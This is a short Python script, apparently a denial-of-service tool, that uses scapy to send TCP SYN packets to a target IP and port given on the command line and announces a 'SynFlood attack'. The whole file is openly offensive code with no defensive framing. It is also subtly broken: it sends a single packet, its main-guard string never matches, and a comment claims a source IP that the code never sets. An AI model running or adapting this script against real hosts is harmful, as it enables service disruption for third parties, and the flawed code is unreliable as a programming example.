import socket, random, sys
from scapy.all import *

# attack to a specific target and from specific source ip
def SynFlood(target, port):
      ip = IP( dst=target)
      tcp = TCP( sport=RandShort( ) , dport=port , flags="S" )
      p = ip / tcp
      send(p , count=1, verbose=0)

def attack (target, port) :
      SynFlood(target, port)
      print("Packet sent ")

if __name__ == " __main__ " :
      # required ip addres and port
      if len( sys.argv )!= 3:
            print("few arguments")
            sys.exit( 1 )

target= sys.argv[1]
port = int(sys.argv[2])

print("Starting SynFlood attack on "+target+" : "+str(port)) 
attack(target,port)